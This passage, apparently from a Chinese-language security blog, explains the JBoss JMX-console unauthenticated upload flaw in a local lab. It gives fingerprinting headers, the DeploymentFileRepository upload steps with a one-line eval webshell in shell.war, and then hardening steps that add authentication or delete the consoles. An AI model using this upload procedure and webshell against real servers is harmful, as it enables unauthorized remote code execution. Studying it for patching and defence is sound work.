<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss6: \server\default\deploy\jbossweb.sar\server.xml</span><br><span class="line">JBoss4: \server\default\deploy\jboss-web.deployer\server.xml</span><br><span class="line"></span><br><span class="line">将address=&quot;$&#123;jboss.bind.address&#125;&quot;改成address=&quot;0.0.0.0&quot;</span><br></pre></td></tr></table></figure>

<p>启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss\bin\run.bat</span><br><span class="line"></span><br><span class="line">访问http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>JBoss漏洞检测</strong></p>
<ol>
<li>JBoss漏洞检测工具下载</li>
</ol>
<p><a href="https://github.com/fupinglee/JavaTools/tree/master/JBoss">https://github.com/fupinglee/JavaTools/tree/master/JBoss</a></p>
<ol start="2">
<li>先探测是否具有JBoss服务</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;jboss&quot;</span><br></pre></td></tr></table></figure>

<p>根据HTTP头部</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># http头部显示jboss服务和版本信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>JBoss-EAP/7</span><br><span class="line"># http头部显示，Apache-Coyote 是Tomcat的连接器，被多个Java servlet容器使用作为socket处理组件，有tomcat，jboss等</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache-Coyote/1.1</span><br><span class="line"># X-Powered-By</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>Servlet 2.4; JBoss-4.2.3.GA</span><br></pre></td></tr></table></figure>



<p><strong>访问如下URL</strong></p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/jmx-console/HtmlAdaptor?action=inspectMBean&amp;name=jboss.admin:service=DeploymentFileRepository</span><br></pre></td></tr></table></figure>

<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gu2b2e3akxj60m00b9aej02.jpg" alt="JBoss文件上传store().png"></p>
<p>在P1输入上传的war包，如<code>shell.war</code></p>
<p>在P2输入上传的文件名，如<code>shell</code></p>
<p>在P3输入上传的文件格式，如<code>.jsp</code></p>
<p>在P4输入上传的文件内容，如一句话<code>&lt;%eval request(&quot;admin&quot;)%&gt;</code></p>
<p>最后点击<code>Invoke</code>上传</p>
<p>上传的路径为<code>JBos/server/default/deploy/management/shell.war/shell.jsp</code></p>
<p>访问以下URL链接shell</p>
<p><code>http://127.0.0.1:8080/shell/shell.jsp</code></p>
<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
<li>将JBoss后台添加权限，控制访问者对敏感路径访问</li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\jmx-console.war\WEB-INF\jboss-web.xml</span><br><span class="line">＃　删除下列代码的注释,添加账号密码访问</span><br><span class="line"><span class="tag">&lt;<span class="name">security-domain</span>&gt;</span>java:/jaas/jmx-console<span class="tag">&lt;/<span class="name">security-domain</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\jmx-console.war\WEB-INF\web.xml</span><br><span class="line">＃　删除下列代码的注释，只有拥有系统配置的登录角色JBossAdmin的用户才能访问</span><br><span class="line"><span class="tag">&lt;<span class="name">security-constraint</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">web-resource-name</span>&gt;</span>HtmlAdaptor<span class="tag">&lt;/<span class="name">web-resource-name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">description</span>&gt;</span>An example security config that only allows users with the role JBossAdmin to access the HTML JMX console web application</span><br><span class="line">		<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">http-method</span>&gt;</span>GET<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">http-method</span>&gt;</span>POST<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">role-name</span>&gt;</span>JBossAdmin<span class="tag">&lt;/<span class="name">role-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">security-constraint</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"># 这里修改账号密码</span><br><span class="line">jboss\server\default\conf\props\jmx-console-users.properties</span><br><span class="line">#　这里修改账号权限</span><br><span class="line">jboss\server\default\conf\props\jmx-console-roles.properties</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>更新到 JBoss 5.1.0 或者6.0.0以上</li>
<li>若不使用控制平台管理，删除<code>jmx-console.war</code>和<code>web-console.war</code>，在以下路径</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jboss\server\all\deploy\jmx-console.war</span><br><span class="line">jboss\server\default\deploy\jmx-console.war</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>Web服务器漏洞</category>
        <category>常规漏洞</category>
        <category>文件上传漏洞</category>
        <category>JBoss</category>
      </categories>
      <tags>
        <tag>访问控制错误漏洞</tag>
        <tag>文件上传漏洞</tag>
      </tags>
  </entry>
</search>
